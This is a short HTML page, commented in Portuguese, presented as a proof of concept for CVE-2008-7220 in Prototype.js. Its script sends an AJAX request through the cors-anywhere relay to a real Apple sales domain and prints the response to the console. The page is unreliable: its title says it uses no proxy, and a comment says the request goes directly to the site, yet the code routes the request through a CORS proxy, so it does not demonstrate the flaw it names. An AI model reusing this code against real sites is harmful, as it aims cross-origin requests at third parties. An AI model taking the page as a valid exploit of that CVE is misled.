    <h1>CVE-2008-7220 PoC sem Proxy</h1>

    <!-- Carrega o Prototype.js localmente ou de um CDN -->
    <script type="text/javascript" src="/prototype.js"></script>

    <script type="text/javascript">
    var url = 'https://cors-anywhere.herokuapp.com/https://sales.apple.com/home';  // URL com bypass de CORS

    // Faz a solicitação AJAX para o servidor de destino diretamente (bypass de CORS)
    new Ajax.Request(url, {
        method: 'get',
        onSuccess: function(transport) {
            console.log(transport.responseText);  // Exibe a resposta no console
        },
        onFailure: function() {
            console.log('Falha na solicitação AJAX.');
        }
    });
    </script>
